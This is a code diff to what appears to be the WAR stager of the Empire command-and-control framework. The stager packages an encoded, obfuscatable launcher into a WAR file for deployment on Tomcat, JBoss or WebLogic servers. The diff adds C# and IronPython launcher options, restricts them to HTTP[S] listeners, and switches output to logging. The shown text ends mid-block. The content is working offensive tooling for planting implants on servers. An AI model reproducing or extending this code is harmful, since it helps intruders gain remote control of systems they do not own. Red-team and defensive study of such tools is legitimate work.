@@ -1,16 +1,24 @@
+from __future__ import print_function
+
 import io
+import logging
 import zipfile
 from builtins import object, str
 
-from empire.server.common import helpers
+log = logging.getLogger(__name__)
 
 
 class Stager(object):
     def __init__(self, mainMenu, params=[]):
-
         self.info = {
             "Name": "WAR",
-            "Author": ["Andrew @ch33kyf3ll0w Bonstrom"],
+            "Authors": [
+                {
+                    "Name": "Andrew Bonstrom",
+                    "Handle": "@ch33kyf3ll0w",
+                    "Link": "",
+                }
+            ],
             "Description": "Generates a Deployable War file.",
             "Comments": [
                 "You will need to deploy the WAR file to activate. Great for interfaces that accept a WAR file such as Apache Tomcat, JBoss, or Oracle Weblogic Servers."
@@ -30,7 +38,7 @@ class Stager(object):
                 "Description": "Language of the stager to generate.",
                 "Required": True,
                 "Value": "powershell",
-                "SuggestedValues": ["powershell"],
+                "SuggestedValues": ["powershell", "csharp", "ironpython"],
                 "Strict": True,
             },
             "StagerRetries": {
@@ -88,7 +96,6 @@ class Stager(object):
                 self.options[option]["Value"] = value
 
     def generate(self):
-
         # extract all of our options
         language = self.options["Language"]["Value"]
         listener_name = self.options["Listener"]["Value"]
@@ -108,21 +115,41 @@ class Stager(object):
         if app_name == "":
             app_name = listener_name
 
-        # generate the launcher code
-        launcher = self.mainMenu.stagers.generate_launcher(
-            listener_name,
-            language=language,
-            encode=True,
-            obfuscate=obfuscate,
-            obfuscationCommand=obfuscate_command,
-            userAgent=user_agent,
-            proxy=proxy,
-            proxyCreds=proxy_creds,
-            stagerRetries=stager_retries,
-        )
+        if language in ["csharp", "ironpython"]:
+            if (
+                self.mainMenu.listenersv2.get_active_listener_by_name(
+                    listener_name
+                ).info["Name"]
+                != "HTTP[S]"
+            ):
+                log.error(
+                    "Only HTTP[S] listeners are supported for C# and IronPython stagers."
+                )
+                return ""
+
+            launcher = self.mainMenu.stagers.generate_exe_oneliner(
+                language=language,
+                obfuscate=obfuscate,
+                obfuscation_command=obfuscate_command,
+                encode=True,
+                listener_name=listener_name,
+            )
+        elif language == "powershell":
+            # generate the launcher code
+            launcher = self.mainMenu.stagers.generate_launcher(
+                listener_name,
+                language=language,
+                encode=True,
+                obfuscate=obfuscate_script,
+                obfuscation_command=obfuscate_command,
+                userAgent=user_agent,
+                proxy=proxy,
+                proxyCreds=proxy_creds,
+                stagerRetries=stager_retries,
+            )
 
         if launcher == "":
-            print(helpers.color("[!] Error in launcher command generation."))
+            log.error("Error in launcher command generation.")
             return ""
 
         else:
